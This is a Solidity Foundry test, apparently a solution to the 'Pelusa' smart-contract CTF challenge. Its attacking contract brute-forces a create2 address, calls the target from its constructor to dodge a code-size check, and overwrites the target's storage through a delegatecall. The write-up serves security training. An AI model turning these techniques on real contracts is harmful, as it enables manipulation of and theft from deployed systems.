// SPDX-License-Identifier: None
pragma solidity 0.8.7;

import { Test } from "forge-std/Test.sol";
import { IGame, Pelusa } from "../src/Pelusa.sol";

/**
 * @title   Answer to the Pelusa Challenge
 * @notice  Various sub-strategies:
 *          - Pass the address modulo check by using a create2 deployment (bruteforce it, as it should be a Pr(0.1) event)
 *          - Pass the 0 code length by executing the logic within the constructor
 *          - Pass the getBallPossession hash check by passing the args to the attacking contract, at deployment time
 *          - Change the goal variabl in the attacking contract, as it is used via delegatecalled, it will change Pelusa one
 * @author  DrGorilla.eth
 */
contract PelusaTest is Test {
    Pelusa _contract;
    address _pelusaDeployer;
    uint256 _pelusaDeploymentBlock;

    /**
     * @dev Deploy the Pelusa contract and take note of block height and deployer address
     */
    function setUp() public {
        _contract = new Pelusa();
        _pelusaDeployer = address(this);
        _pelusaDeploymentBlock = block.number;
    }

    function testPelusa() public {
        // Find a cool enough address, by brute forcing create2 salt
        uint256 i;
        while(i < 10000) {
            address _candidate = address(uint160(uint(keccak256(abi.encodePacked(
                bytes1(0xff),
                address(this),
                bytes32(i),
                keccak256(abi.encodePacked(
                    type(Diego).creationCode,
                    abi.encode(_contract, _pelusaDeployer, _pelusaDeploymentBlock)
                ))
            )))));

            if(uint256(uint160(_candidate)) % 100 == 10) break;

            i++;
        }

        // Use the cool enough address to get the ball
        Diego _diego = new Diego{salt: bytes32(i)}(_contract, _pelusaDeployer, _pelusaDeploymentBlock);

        // Then shoot it
        _diego.shootDaBall();

        // Check: 2 goals scored?
        assertEq(_contract.goals(), 2);
    }
}

contract Diego {
    // Immutables to keep a clear storage layout for the delegatecall
    Pelusa immutable target;
    address immutable pelusaDeployer;
    uint256 immutable deploymentBlock;

    address internal player; // unused, included for storage layout clarity
    uint256 public goals; // the storage variable we gonna change in Pelusa (as Pelusa delegatecalls this contract)

    /**
     * @dev Pass the ball within the constructor, to have a 0 bytecode (constructor will return the runtime
     *      bytecode, and then only it will be deployed - everything before the return is executed but not stored as runtime bytecode)
     */
    constructor(Pelusa _target, address _pelusaDeployer, uint256 _pelusaDeploymentBlock) {
        target = _target;
        pelusaDeployer = _pelusaDeployer;
        deploymentBlock = _pelusaDeploymentBlock;
        _target.passTheBall();
    }

    function shootDaBall() external {
        target.shoot();
    }

    /**
     * @dev Change the goals variable in Pelusa, as it is used via delegatecall, it will change the one in Pelusa
     */
    function handOfGod() external returns (uint256) {
        goals = 2;
        return 22_06_1986;
    }

    /**
     * @dev Recreate the same logic as the Pelusa check
     */
    function getBallPossesion() external view returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(pelusaDeployer, blockhash(deploymentBlock))))));
    }
}